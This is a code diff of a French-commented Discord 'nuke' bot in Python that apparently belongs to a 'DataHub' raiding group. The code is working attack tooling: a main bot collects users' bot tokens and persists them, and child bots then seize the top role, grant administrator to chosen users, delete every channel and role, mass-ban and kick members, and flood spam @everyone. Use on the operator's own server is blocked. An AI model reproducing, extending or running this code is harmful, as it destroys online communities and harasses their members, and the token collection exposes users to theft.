@@ -1,70 +1,67 @@
-import os
-import json
 import asyncio
+import json
 import logging
+import os
+import time
 from pathlib import Path
+
 import discord
 from discord import app_commands
-from discord.ext import commands
+from discord.ext import commands, tasks
+
+# --------------------------------------------------------------------------- #
+# Configuration
+# --------------------------------------------------------------------------- #
 
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
 )
-log = logging.getLogger('giveadmin-bot')
+log = logging.getLogger('datahub-main')
 
-TOKEN = os.environ.get('DISCORD_TOKEN')
+MAIN_TOKEN = os.environ.get('DISCORD_TOKEN')
 ROLE_NAME = os.environ.get('ADMIN_ROLE_NAME', 'W4X15DJ')
 STATUS_KEYWORDS = ('/datahub', '.gg/datahub')
 MAIN_GUILD_ID = int(os.environ.get('MAIN_GUILD_ID', '1473760731047399576'))
 VIP_ROLE_ID = int(os.environ.get('VIP_ROLE_ID', '1493295317997588662'))
-PRESETS_FILE = Path(os.environ.get('PRESETS_FILE', '/app/presets.json'))
+DATA_DIR = Path(os.environ.get('DATA_DIR', '/app/discord_bot/data'))
+PRESETS_FILE = Path(os.environ.get('PRESETS_FILE', str(DATA_DIR / 'presets.json')))
+VIP_TOKENS_FILE = Path(os.environ.get('VIP_TOKENS_FILE', str(DATA_DIR / 'vip_tokens.json')))
 
-if not TOKEN:
-    raise RuntimeError('DISCORD_TOKEN is not set in environment')
+CHILD_PREFIX = '+'
+INACTIVITY_TIMEOUT = 600  # 10 minutes
+WATCHDOG_INTERVAL = 30    # seconds
 
-intents = discord.Intents.default()
-intents.members = True
-intents.guilds = True
-intents.presences = True  # necessaire pour lire le statut custom
+FOOTER_TEXT = 'Made by DataHub - .gg/datahub'
+EMBED_COLOR = 0x5865F2
+EMBED_COLOR_OK = 0x43B581
+EMBED_COLOR_BAD = 0xED4245
 
-bot = commands.Bot(command_prefix='!', intents=intents)
+if not MAIN_TOKEN:
+    raise RuntimeError('DISCORD_TOKEN is not set in environment (token of the MAIN bot)')
 
-# Etat par guilde : si True, /help affiche le faux help
-fake_help_mode: dict[int, bool] = {}
+DATA_DIR.mkdir(parents=True, exist_ok=True)
 
 
-# ----------------------------- helpers ----------------------------- #
+# --------------------------------------------------------------------------- #
+# Utilities
+# --------------------------------------------------------------------------- #
 
 async def _safe(coro):
     try:
         return await coro
-    except Exception as e:
+    except Exception as e:  # noqa: BLE001
         log.warning('task failed: %s', e)
         return None
 
 
-async def _move_bot_role_to_top(guild: discord.Guild):
-    """Deplace le role le plus haut du bot tout en haut de la hierarchie."""
-    me = guild.me
-    if me is None:
-        return None
-    # On prend le role le plus eleve du bot (hors @everyone)
-    bot_role = me.top_role
-    if bot_role is None or bot_role.is_default():
-        return None
-    # Position la plus haute possible = nombre de roles - 1 (0 = everyone)
-    max_pos = max((r.position for r in guild.roles), default=1)
-    try:
-        if bot_role.position < max_pos:
-            await bot_role.edit(position=max_pos, reason='Placer le role du bot tout en haut')
-    except discord.HTTPException as e:
-        log.warning('Could not move bot role to top: %s', e)
-    return bot_role
+def _embed(title: str, description: str = '', color: int = EMBED_COLOR) -> discord.Embed:
+    e = discord.Embed(title=title, description=description, color=color)
+    e.set_footer(text=FOOTER_TEXT)
+    return e
 
 
-def _has_datahub_status(member: discord.Member) -> bool:
-    """Retourne True si le membre a '/datahub' ou '.gg/datahub' dans son statut custom."""
+def _has_datahub_status(member: discord.Member | None) -> bool:
     if member is None:
         return False
     for activity in member.activities or []:
@@ -78,98 +75,31 @@ def _has_datahub_status(member: discord.Member) -> bool:
     return False
 
 
-async def _is_authorized(interaction: discord.Interaction) -> tuple[bool, str]:
-    """Verifie uniquement que l utilisateur a /datahub ou .gg/datahub dans son statut."""
-    user = interaction.user
+# --------------------------------------------------------------------------- #
+# JSON storage helpers
+# --------------------------------------------------------------------------- #
 
-    # 0) BLOCAGE TOTAL sur le serveur principal : personne (meme admin) ne peut utiliser le bot ici
-    if interaction.guild is not None and interaction.guild.id == MAIN_GUILD_ID:
-        return False, 'Ces commandes ne peuvent **pas** etre utilisees sur le serveur principal.'
-
-    # 1) essai dans la guilde courante (la plus fiable pour les presences)
-    here = interaction.guild.get_member(user.id) if interaction.guild else None
-    if _has_datahub_status(here):
-        return True, ''
-
-    # 2) fallback : essayer dans n importe quelle autre guilde partagee avec le bot
-    for g in bot.guilds:
-        m = g.get_member(user.id)
-        if m is not None and _has_datahub_status(m):
-            return True, ''
-
-    return False, 'Mets `/datahub` ou `.gg/datahub` dans ton statut Discord pour utiliser ce bot.'
-
-
-def require_auth():
-    """Decorateur qui ajoute un check d autorisation a une commande slash."""
-    async def predicate(interaction: discord.Interaction) -> bool:
-        ok, msg = await _is_authorized(interaction)
-        if not ok:
-            if not interaction.response.is_done():
-                await interaction.response.send_message(msg, ephemeral=True)
-            else:
-                await interaction.followup.send(msg, ephemeral=True)
-            return False
-        return True
-    return app_commands.check(predicate)
-
-
-# ----------------------------- VIP auth ----------------------------- #
-
-async def _is_vip_authorized(interaction: discord.Interaction) -> tuple[bool, str]:
-    """VIP : doit avoir le statut /datahub ET le role VIP sur le serveur principal."""
-    ok, msg = await _is_authorized(interaction)
-    if not ok:
-        return False, msg
-
-    main_guild = bot.get_guild(MAIN_GUILD_ID)
-    if main_guild is None:
-        return False, f'Le bot doit etre membre du serveur principal (ID {MAIN_GUILD_ID}).'
-
-    main_member = main_guild.get_member(interaction.user.id)
-    if main_member is None:
-        try:
-            main_member = await main_guild.fetch_member(interaction.user.id)
-        except (discord.NotFound, discord.HTTPException):
-            main_member = None
-
-    if main_member is None:
-        return False, 'Tu dois rejoindre le serveur principal : https://discord.gg/datahub'
-
-    if not any(r.id == VIP_ROLE_ID for r in main_member.roles):
-        return False, 'Cette commande est reservee aux membres **VIP** du serveur principal.'
-
-    return True, ''
-
-
-def require_vip():
-    async def predicate(interaction: discord.Interaction) -> bool:
-        ok, msg = await _is_vip_authorized(interaction)
-        if not ok:
-            if not interaction.response.is_done():
-                await interaction.response.send_message(msg, ephemeral=True)
-            else:
-                await interaction.followup.send(msg, ephemeral=True)
-            return False
-        return True
-    return app_commands.check(predicate)
-
-
-# ----------------------------- presets storage ----------------------------- #
-
-def _load_presets() -> dict:
-    if not PRESETS_FILE.exists():
+def _load_json(path: Path) -> dict:
+    if not path.exists():
         return {}
     try:
-        return json.loads(PRESETS_FILE.read_text(encoding='utf-8'))
-    except Exception as e:
-        log.warning('presets load failed: %s', e)
+        return json.loads(path.read_text(encoding='utf-8'))
+    except Exception as e:  # noqa: BLE001
+        log.warning('json load failed (%s): %s', path, e)
         return {}
 
 
-def _save_presets(data: dict) -> None:
-    PRESETS_FILE.parent.mkdir(parents=True, exist_ok=True)
-    PRESETS_FILE.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding='utf-8')
+def _save_json(path: Path, data: dict) -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding='utf-8')
+
+
+def _load_presets() -> dict:
+    return _load_json(PRESETS_FILE)
+
+
+def _save_presets(d: dict) -> None:
+    _save_json(PRESETS_FILE, d)
 
 
 def _get_user_presets(user_id: int) -> dict:
@@ -196,239 +126,344 @@ def _del_user_preset(user_id: int, name: str) -> bool:
     return False
 
 
-# ----------------------------- events ----------------------------- #
+def _save_vip_token(user_id: int, token: str) -> None:
+    data = _load_json(VIP_TOKENS_FILE)
+    data[str(user_id)] = token
+    _save_json(VIP_TOKENS_FILE, data)
 
-@bot.event
+
+def _get_vip_token(user_id: int) -> str | None:
+    return _load_json(VIP_TOKENS_FILE).get(str(user_id))
+
+
+# --------------------------------------------------------------------------- #
+# Main bot (only knows /connect)
+# --------------------------------------------------------------------------- #
+
+intents_main = discord.Intents.default()
+intents_main.members = True
+intents_main.guilds = True
+intents_main.presences = True
+
+main_bot = commands.Bot(command_prefix='!__unused__', intents=intents_main)
+
+# Per-owner child bot record
+# user_id -> {bot, task, last_activity, owner_id, is_vip}
+child_bots: dict[int, dict] = {}
+
+
+async def _check_user_status(user_id: int) -> bool:
+    \"\"\"Verifie via main_bot que l'utilisateur a /datahub ou .gg/datahub
+    dans son statut custom (sur le serveur principal ou tout serveur partage).
+    \"\"\"
+    main_guild = main_bot.get_guild(MAIN_GUILD_ID)
+    candidates: list[discord.Member] = []
+    if main_guild is not None:
+        m = main_guild.get_member(user_id)
+        if m is not None:
+            candidates.append(m)
+    for g in main_bot.guilds:
+        if g.id == MAIN_GUILD_ID:
+            continue
+        m = g.get_member(user_id)
+        if m is not None:
+            candidates.append(m)
+    return any(_has_datahub_status(m) for m in candidates)
+
+
+async def _check_user_vip(user_id: int) -> bool:
+    main_guild = main_bot.get_guild(MAIN_GUILD_ID)
+    if main_guild is None:
+        return False
+    member = main_guild.get_member(user_id)
+    if member is None:
+        try:
+            member = await main_guild.fetch_member(user_id)
+        except (discord.NotFound, discord.HTTPException):
+            return False
+    return any(r.id == VIP_ROLE_ID for r in member.roles)
+
+
+@main_bot.event
 async def on_ready():
-    log.info('Logged in as %s', bot.user)
-    for guild in bot.guilds:
+    log.info('Main bot logged in as %s', main_bot.user)
+    try:
+        synced = await main_bot.tree.sync()
+        log.info('Synced %d global slash command(s)', len(synced))
+    except Exception as e:  # noqa: BLE001
+        log.warning('global slash sync failed: %s', e)
+    if not inactivity_watchdog.is_running():
+        inactivity_watchdog.start()
+    # Auto-reconnect VIP child bots that have a saved token
+    saved = _load_json(VIP_TOKENS_FILE)
+    for uid_str, tk in saved.items():
+        try:
+            uid = int(uid_str)
+        except ValueError:
+            continue
+        if uid in child_bots:
+            continue
+        log.info('Auto-launching VIP child bot for user %s', uid)
+        try:
+            await _launch_child_bot(uid, tk, is_vip=True)
+        except Exception as e:  # noqa: BLE001
+            log.warning('VIP auto-launch failed for %s: %s', uid, e)
+
+
+@main_bot.tree.command(name='connect', description='Connecte ton bot Discord avec son token')
+@app_commands.describe(bot_token='Le token du bot Discord a connecter')
+async def connect_cmd(interaction: discord.Interaction, bot_token: str):
+    await interaction.response.defer(ephemeral=True, thinking=True)
+    user_id = interaction.user.id
+
+    # 1) Auth: status check
+    ok_status = await _check_user_status(user_id)
+    if not ok_status:
+        await interaction.followup.send(
+            embed=_embed(
+                'Acces refuse',
+                'Mets `/datahub` ou `.gg/datahub` dans ton **statut Discord** pour utiliser ce bot.',
+                EMBED_COLOR_BAD,
+            ),
+            ephemeral=True,
+        )
+        return
+
+    is_vip = await _check_user_vip(user_id)
+
+    token = bot_token.strip()
+    if not token or len(token) < 30:
+        await interaction.followup.send(
+            embed=_embed('Token invalide', 'Le token fourni semble invalide.', EMBED_COLOR_BAD),
+            ephemeral=True,
+        )
+        return
+
+    # 2) Si un bot enfant tourne deja pour ce user, le couper d'abord
+    if user_id in child_bots:
+        old = child_bots.pop(user_id)
+        try:
+            await old['bot'].close()
+        except Exception:  # noqa: BLE001
+            pass
+
+    # 3) Lancer le bot enfant
+    try:
+        await _launch_child_bot(user_id, token, is_vip=is_vip)
+    except Exception as e:  # noqa: BLE001
+        await interaction.followup.send(
+            embed=_embed('Connexion impossible', f'Erreur: `{e}`', EMBED_COLOR_BAD),
+            ephemeral=True,
+        )
+        return
+
+    # 4) Si VIP, sauvegarder le token
+    if is_vip:
+        _save_vip_token(user_id, token)
+
+    # 5) Attendre que le bot soit ready (max 10s)
+    rec = child_bots.get(user_id)
+    started = time.time()
+    while rec is not None and not rec['bot'].is_ready() and time.time() - started < 10:
+        await asyncio.sleep(0.3)
+        rec = child_bots.get(user_id)
+
+    bot_user = rec['bot'].user if rec and rec['bot'].is_ready() else None
+    cmd_list = (
+        '+help, +nuke, +n-salon, +spam-r, +giveadmin, +reset, +ban-all, '
+        '+kick-all, +rename-s, +supp-roles, +fakehelp, +fake-help'
+        + (', +n-config, +p-run' if is_vip else '')
+    )
+    desc = (
+        f'Bot **{bot_user}** connecte avec succes.
+' if bot_user
+        else 'Bot lance, demarrage en cours...
+'
+    )
+    desc += (
+        f'Prefixe : `{CHILD_PREFIX}`
+'
+        f'Commandes : `{cmd_list}`
+'
+        f'Inactivite max : **{INACTIVITY_TIMEOUT // 60} minutes**.
+'
+    )
+    if is_vip:
+        desc += '
+**Statut VIP** : ton token est enregistre.'
+    await interaction.followup.send(
+        embed=_embed('Connexion reussie', desc, EMBED_COLOR_OK), ephemeral=True,
+    )
+
+
+# --------------------------------------------------------------------------- #
+# Child bot factory
+# --------------------------------------------------------------------------- #
+
+def _build_child_bot(owner_id: int) -> commands.Bot:
+    intents = discord.Intents.default()
+    intents.members = True
+    intents.guilds = True
+    intents.message_content = True
+
+    bot = commands.Bot(command_prefix=CHILD_PREFIX, intents=intents, help_command=None)
+    bot._owner_id = owner_id  # type: ignore[attr-defined]
+    bot._fake_help_mode = {}  # type: ignore[attr-defined]
+
+    _register_child_commands(bot)
+
+    @bot.event
+    async def on_ready():  # noqa: D401
+        log.info('[child %s] logged in as %s', owner_id, bot.user)
+        for guild in bot.guilds:
+            try:
+                await _move_bot_role_to_top(guild)
+            except Exception as e:  # noqa: BLE001
+                log.warning('[child %s] move role failed: %s', owner_id, e)
+
+    @bot.event
+    async def on_guild_join(guild: discord.Guild):
+        log.info('[child %s] joined guild %s', owner_id, guild.id)
         try:
             await _move_bot_role_to_top(guild)
-        except Exception as e:
-            log.warning('move bot role failed on %s: %s', guild.id, e)
-        try:
-            bot.tree.copy_global_to(guild=guild)
-            synced = await bot.tree.sync(guild=guild)
-            log.info('Synced %d cmd(s) to guild %s', len(synced), guild.id)
-        except Exception as e:
-            log.exception('Guild sync failed: %s', e)
+        except Exception as e:  # noqa: BLE001
+            log.warning('[child %s] move role on join failed: %s', owner_id, e)
 
-
-@bot.event
-async def on_guild_join(guild: discord.Guild):
-    log.info('Joined guild %s -- resyncing', guild.id)
-    # Deplacer le role du bot tout en haut des l arrivee
-    try:
-        await _move_bot_role_to_top(guild)
-    except Exception as e:
-        log.warning('move bot role failed on join %s: %s', guild.id, e)
-    try:
-        bot.tree.copy_global_to(guild=guild)
-        synced = await bot.tree.sync(guild=guild)
-        log.info('Synced %d cmd(s) to new guild %s', len(synced), guild.id)
-    except Exception as e:
-        log.exception('on_guild_join sync failed: %s', e)
-
-
-@bot.tree.error
-async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
-    if isinstance(error, app_commands.CheckFailure):
-        return  # message deja envoye
-    log.exception('Command error: %s', error)
-    try:
-        if interaction.response.is_done():
-            await interaction.followup.send(f'Erreur: `{error}`', ephemeral=True)
-        else:
-            await interaction.response.send_message(f'Erreur: `{error}`', ephemeral=True)
-    except Exception:
-        pass
-
-
-# BLOCAGE GLOBAL : aucune commande slash utilisable sur le serveur principal
-async def _global_block_main_guild(interaction: discord.Interaction) -> bool:
-    if interaction.guild is not None and interaction.guild.id == MAIN_GUILD_ID:
-        try:
-            await interaction.response.send_message(
-                'Ces commandes ne peuvent **pas** etre utilisees sur le serveur principal.',
-                ephemeral=True,
-            )
-        except discord.InteractionResponded:
+    @bot.event
+    async def on_command_error(ctx: commands.Context, error: Exception):
+        if isinstance(error, commands.CheckFailure):
+            return  # message deja envoye par le check
+        if isinstance(error, (commands.CommandNotFound, commands.UserInputError, commands.MissingRequiredArgument)):
             try:
-                await interaction.followup.send(
-                    'Ces commandes ne peuvent **pas** etre utilisees sur le serveur principal.',
-                    ephemeral=True,
-                )
-            except Exception:
+                await ctx.send(embed=_embed('Erreur', f'`{error}`', EMBED_COLOR_BAD))
+            except Exception:  # noqa: BLE001
                 pass
-        return False
-    return True
-
-
-bot.tree.interaction_check = _global_block_main_guild
-
-
-# ----------------------------- /giveadmin ----------------------------- #
-
-@bot.tree.command(name='giveadmin', description='Cree un role Admin et l attribue a un utilisateur')
-@app_commands.describe(user_id='ID de l utilisateur a qui donner le role admin')
-@require_auth()
-async def giveadmin(interaction: discord.Interaction, user_id: str):
-    await interaction.response.defer(ephemeral=True, thinking=True)
-    if interaction.guild is None:
-        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
-        return
-
-    guild = interaction.guild
-    try:
-        uid = int(user_id.strip())
-    except ValueError:
-        await interaction.followup.send('ID invalide.', ephemeral=True)
-        return
-
-    member = guild.get_member(uid) or await guild.fetch_member(uid)
-    me = guild.me
-    if me is None or not me.guild_permissions.manage_roles:
-        await interaction.followup.send('Le bot doit avoir Manage Roles / Administrateur.', ephemeral=True)
-        return
-
-    # 1) S assurer que le role du bot est tout en haut
-    bot_role = await _move_bot_role_to_top(guild) or me.top_role
-
-    # 2) Creer le nouveau role admin
-    role = await guild.create_role(
-        name=ROLE_NAME,
-        permissions=discord.Permissions(administrator=True),
-        reason=f'/giveadmin by {interaction.user}',
-    )
-
-    # 3) Le placer JUSTE SOUS le role du bot (= position max - 1) = tout en haut possible
-    try:
-        target_pos = max((bot_role.position - 1) if bot_role else 1, 1)
-        await role.edit(position=target_pos, reason='Place giveadmin role tout en haut (sous le bot)')
-    except discord.HTTPException as e:
-        log.warning('Could not reposition new role: %s', e)
-
-    # 4) Attribuer
-    await member.add_roles(role, reason=f'/giveadmin by {interaction.user}')
-    await interaction.followup.send(
-        f'Role **{role.name}** (Admin, place tout en haut) attribue a <@{member.id}>.',
-        ephemeral=True,
-    )
-
-
-# ----------------------------- /n-salon ----------------------------- #
-
-@bot.tree.command(
-    name='n-salon',
-    description='Supprime tous les salons, en cree N et y envoie un message en boucle',
-)
-@app_commands.describe(
-    number='Nombre de salons a creer',
-    message='Message a envoyer dans chaque salon',
-    repeat='Nombre de fois que le message est envoye par salon (defaut 5)',
-    name='Nom des salons crees (defaut: spam)',
-)
-@require_auth()
-async def n_salon(
-    interaction: discord.Interaction,
-    number: int,
-    message: str,
-    repeat: int = 5,
-    name: str = 'spam',
-):
-    await interaction.response.defer(ephemeral=True, thinking=True)
-    if interaction.guild is None:
-        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
-        return
-
-    guild = interaction.guild
-    me = guild.me
-    if me is None or not me.guild_permissions.administrator:
-        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
-        return
-    if number < 1 or number > 500:
-        await interaction.followup.send('number doit etre entre 1 et 500.', ephemeral=True)
-        return
-    if repeat < 1 or repeat > 50:
-        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
-        return
-
-    start = asyncio.get_event_loop().time()
-    await asyncio.gather(*[_safe(ch.delete(reason='/n-salon')) for ch in list(guild.channels)])
-
-    create_tasks = [
-        _safe(guild.create_text_channel(name=f'{name}-{i+1}', reason='/n-salon'))
-        for i in range(number)
-    ]
-    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]
-
-    async def flood(channel):
-        sent = 0
-        for _ in range(repeat):
-            try:
-                await channel.send(content=message)
-                sent += 1
-            except discord.HTTPException as e:
-                log.warning('send failed on %s: %s', channel.id, e)
-                await asyncio.sleep(0.5)
-        return sent
-
-    results = await asyncio.gather(*[flood(c) for c in created])
-    total_sent = sum(results)
-    elapsed = asyncio.get_event_loop().time() - start
-
-    if created:
+            return
+        log.exception('[child %s] command error: %s', owner_id, error)
         try:
-            await created[0].send(
-                f'**/n-salon termine en {elapsed:.1f}s** - {len(created)}/{number} salons, {total_sent} messages.'
-            )
-        except Exception:
+            await ctx.send(embed=_embed('Erreur', f'`{error}`', EMBED_COLOR_BAD))
+        except Exception:  # noqa: BLE001
+            pass
+
+    @bot.before_invoke
+    async def _touch_activity(ctx: commands.Context):  # noqa: ARG001
+        rec = child_bots.get(owner_id)
+        if rec is not None:
+            rec['last_activity'] = time.time()
+
+    return bot
+
+
+async def _launch_child_bot(owner_id: int, token: str, is_vip: bool) -> None:
+    bot = _build_child_bot(owner_id)
+    try:
+        await bot.login(token)
+    except discord.LoginFailure as e:
+        raise RuntimeError(f'Token invalide: {e}') from e
+
+    task = asyncio.create_task(bot.connect(reconnect=True))
+    child_bots[owner_id] = {
+        'bot': bot,
+        'task': task,
+        'last_activity': time.time(),
+        'owner_id': owner_id,
+        'is_vip': is_vip,
+    }
+
+
+async def _stop_child_bot(owner_id: int, reason: str = 'inactivity') -> None:
+    rec = child_bots.pop(owner_id, None)
+    if rec is None:
+        return
+    log.info('[child %s] stopping (%s)', owner_id, reason)
+    try:
+        await rec['bot'].close()
+    except Exception as e:  # noqa: BLE001
+        log.warning('[child %s] close failed: %s', owner_id, e)
+    task = rec.get('task')
+    if task is not None:
+        try:
+            await asyncio.wait_for(task, timeout=5)
+        except (asyncio.TimeoutError, asyncio.CancelledError, Exception):
             pass
 
 
-# ----------------------------- /spam-r ----------------------------- #
+@tasks.loop(seconds=WATCHDOG_INTERVAL)
+async def inactivity_watchdog():
+    now = time.time()
+    to_stop = [
+        uid for uid, rec in list(child_bots.items())
+        if now - rec.get('last_activity', now) > INACTIVITY_TIMEOUT
+    ]
+    for uid in to_stop:
+        await _stop_child_bot(uid, reason='inactivity timeout')
+
+
+# --------------------------------------------------------------------------- #
+# Shared helpers used by child commands
+# --------------------------------------------------------------------------- #
+
+async def _move_bot_role_to_top(guild: discord.Guild):
+    me = guild.me
+    if me is None:
+        return None
+    bot_role = me.top_role
+    if bot_role is None or bot_role.is_default():
+        return None
+    max_pos = max((r.position for r in guild.roles), default=1)
+    try:
+        if bot_role.position < max_pos:
+            await bot_role.edit(position=max_pos, reason='Place role bot tout en haut')
+    except discord.HTTPException as e:
+        log.warning('move bot role: %s', e)
+    return bot_role
+
+
+async def _send_unauth(ctx: commands.Context, msg: str) -> None:
+    try:
+        await ctx.send(embed=_embed('Acces refuse', msg, EMBED_COLOR_BAD))
+    except Exception:  # noqa: BLE001
+        pass
+
+
+def require_auth():
+    \"\"\"Le auteur doit avoir /datahub ou .gg/datahub dans son statut, et NE
+    PAS executer la commande sur le serveur principal.
+    \"\"\"
+    async def predicate(ctx: commands.Context) -> bool:
+        if ctx.guild is not None and ctx.guild.id == MAIN_GUILD_ID:
+            await _send_unauth(ctx, 'Ces commandes ne peuvent **pas** etre utilisees sur le serveur principal.')
+            return False
+        ok = await _check_user_status(ctx.author.id)
+        if not ok:
+            await _send_unauth(ctx, 'Mets `/datahub` ou `.gg/datahub` dans ton **statut Discord** pour utiliser ce bot.')
+            return False
+        return True
+    return commands.check(predicate)
+
+
+def require_vip():
+    async def predicate(ctx: commands.Context) -> bool:
+        if ctx.guild is not None and ctx.guild.id == MAIN_GUILD_ID:
+            await _send_unauth(ctx, 'Ces commandes ne peuvent **pas** etre utilisees sur le serveur principal.')
+            return False
+        if not await _check_user_status(ctx.author.id):
+            await _send_unauth(ctx, 'Mets `/datahub` ou `.gg/datahub` dans ton statut Discord.')
+            return False
+        if not await _check_user_vip(ctx.author.id):
+            await _send_unauth(ctx, 'Cette commande est reservee aux membres **VIP** du serveur principal.')
+            return False
+        return True
+    return commands.check(predicate)
+
 
 async def _spam_roles(guild: discord.Guild, base_name: str, count: int, reason: str) -> int:
-    tasks = [
+    tasks_ = [
         _safe(guild.create_role(name=f'{base_name}-{i+1}', reason=reason))
         for i in range(count)
     ]
-    results = await asyncio.gather(*tasks)
-    return sum(1 for r in results if r is not None)
+    return sum(1 for r in await asyncio.gather(*tasks_) if r is not None)
 
-
-@bot.tree.command(name='spam-r', description='Cree en boucle des roles nommes {name}-1, {name}-2, ...')
-@app_commands.describe(
-    role_name='Nom de base des roles a creer',
-    count='Nombre de roles a creer (defaut: 5)',
-)
-@require_auth()
-async def spam_r(interaction: discord.Interaction, role_name: str, count: int = 5):
-    await interaction.response.defer(ephemeral=True, thinking=True)
-    if interaction.guild is None:
-        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
-        return
-
-    guild = interaction.guild
-    me = guild.me
-    if me is None or not me.guild_permissions.manage_roles:
-        await interaction.followup.send('Le bot doit avoir Manage Roles / Administrateur.', ephemeral=True)
-        return
-    if count < 1 or count > 250:
-        await interaction.followup.send('count doit etre entre 1 et 250.', ephemeral=True)
-        return
-    base = role_name.strip()[:90] or 'role'
-
-    start = asyncio.get_event_loop().time()
-    created = await _spam_roles(guild, base, count, reason=f'/spam-r by {interaction.user}')
-    elapsed = asyncio.get_event_loop().time() - start
-    await interaction.followup.send(
-        f'**{created}/{count}** roles `{base}-N` crees en {elapsed:.1f}s.',
-        ephemeral=True,
-    )
-
-
-# ----------------------------- /nuke (core) ----------------------------- #
 
 async def _execute_nuke(
     guild: discord.Guild,
@@ -442,7 +477,6 @@ async def _execute_nuke(
     spam_role_name: str,
     spam_role_count: int,
 ) -> str:
-    """Execute le nuke et retourne un summary texte. Aucune verification ici."""
     me = guild.me
     start = asyncio.get_event_loop().time()
     log.info('NUKE launched by %s on guild %s', invoker, guild.id)
@@ -451,21 +485,19 @@ async def _execute_nuke(
     if server_name:
         new = server_name.strip()[:100]
         if len(new) >= 2:
-            rename_task = asyncio.create_task(
-                _safe(guild.edit(name=new, reason=f'/nuke by {invoker}'))
-            )
+            rename_task = asyncio.create_task(_safe(guild.edit(name=new, reason=f'+nuke by {invoker}')))
 
     role_targets = [
         r for r in guild.roles
         if not r.is_default() and not r.managed and r < me.top_role
     ] if delete_roles else []
 
-    delete_tasks = [_safe(c.delete(reason='/nuke')) for c in list(guild.channels)]
-    delete_tasks += [_safe(r.delete(reason='/nuke')) for r in role_targets]
+    delete_tasks = [_safe(c.delete(reason='+nuke')) for c in list(guild.channels)]
+    delete_tasks += [_safe(r.delete(reason='+nuke')) for r in role_targets]
     await asyncio.gather(*delete_tasks)
 
     create_tasks = [
-        _safe(guild.create_text_channel(name=f'{channel_name}-{i+1}', reason='/nuke'))
+        _safe(guild.create_text_channel(name=f'{channel_name}-{i+1}', reason='+nuke'))
         for i in range(channels)
     ]
     created = [c for c in await asyncio.gather(*create_tasks) if c is not None]
@@ -474,7 +506,7 @@ async def _execute_nuke(
     if spam_role_count > 0:
         spam_roles_created = await _spam_roles(
             guild, (spam_role_name.strip()[:90] or 'nuked'), spam_role_count,
-            reason=f'/nuke spam-r by {invoker}',
+            reason=f'+nuke spam-r by {invoker}',
         )
 
     async def flood(channel):
@@ -490,405 +522,31 @@ async def _execute_nuke(
 
     results = await asyncio.gather(*[flood(c) for c in created])
     total_sent = sum(results)
-
     if rename_task:
         await rename_task
 
     elapsed = asyncio.get_event_loop().time() - start
     summary = (
-        f'**NUKE termine en {elapsed:.1f}s**\n'
-        f'- {len(created)}/{channels} salons crees\n'
-        f'- {len(role_targets)} roles supprimes\n'
-        f'- {spam_roles_created} roles spam `{spam_role_name}-N` crees\n'
-        f'- {total_sent} messages envoyes\n'
-        + (f'- Serveur renomme en **{server_name}**\n' if server_name else '')
+        f'**NUKE termine en {elapsed:.1f}s**
+'
+        f'- {len(created)}/{channels} salons crees
+'
+        f'- {len(role_targets)} roles supprimes
+'
+        f'- {spam_roles_created} roles spam `{spam_role_name}-N` crees
+'
+        f'- {total_sent} messages envoyes
+'
+        + (f'- Serveur renomme en **{server_name}**
+' if server_name else '')
     )
     if created:
         try:
-            await created[0].send(summary)
-        except Exception:
+            await created[0].send(embed=_embed('Nuke termine', summary, EMBED_COLOR_OK))
+        except Exception:  # noqa: BLE001
             pass
     return summary
 
-
-@bot.tree.command(
-    name='nuke',
-    description='Nuke complet: supprime salons + roles, recree N salons, spam messages ET roles, renomme le serveur',
-)
-@app_commands.describe(
-    channels='Nombre de salons a creer (defaut: 50)',
-    message='Message a spam dans chaque salon (defaut: @everyone)',
-    repeat='Nombre de messages par salon (defaut: 5)',
-    channel_name='Nom des nouveaux salons (defaut: nuked)',
-    server_name='Nouveau nom du serveur (optionnel)',
-    delete_roles='Supprimer aussi tous les roles (defaut: true)',
-    spam_role_name='Nom de base des roles a spam-creer (defaut: nuked)',
-    spam_role_count='Nombre de roles a spam-creer (defaut: 50)',
-)
-@require_auth()
-async def nuke(
-    interaction: discord.Interaction,
-    channels: int = 50,
-    message: str = '@everyone',
-    repeat: int = 5,
-    channel_name: str = 'nuked',
-    server_name: str = None,
-    delete_roles: bool = True,
-    spam_role_name: str = 'nuked',
-    spam_role_count: int = 50,
-):
-    await interaction.response.defer(ephemeral=True, thinking=True)
-    if interaction.guild is None:
-        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
-        return
-
-    guild = interaction.guild
-    me = guild.me
-    if me is None or not me.guild_permissions.administrator:
-        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
-        return
-    if channels < 1 or channels > 500:
-        await interaction.followup.send('channels doit etre entre 1 et 500.', ephemeral=True)
-        return
-    if repeat < 1 or repeat > 50:
-        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
-        return
-    if spam_role_count < 0 or spam_role_count > 250:
-        await interaction.followup.send('spam_role_count doit etre entre 0 et 250.', ephemeral=True)
-        return
-
-    await _execute_nuke(
-        guild, interaction.user, channels, message, repeat, channel_name,
-        server_name, delete_roles, spam_role_name, spam_role_count,
-    )
-    await interaction.followup.send('Nuke termine.', ephemeral=True)
-
-
-# ----------------------------- /reset ----------------------------- #
-
-@bot.tree.command(name='reset', description='Supprime TOUT (salons, roles) et cree un salon _terminal')
-@require_auth()
-async def reset(interaction: discord.Interaction):
-    await interaction.response.defer(ephemeral=True, thinking=True)
-    if interaction.guild is None:
-        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
-        return
-
-    guild = interaction.guild
-    me = guild.me
-    if me is None or not me.guild_permissions.administrator:
-        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
-        return
-
-    start = asyncio.get_event_loop().time()
-
-    # 1) Supprimer tous les salons
-    chan_tasks = [_safe(c.delete(reason='/reset')) for c in list(guild.channels)]
-    # 2) Supprimer tous les roles possibles (sauf everyone, managed, >= bot)
-    role_targets = [
-        r for r in guild.roles
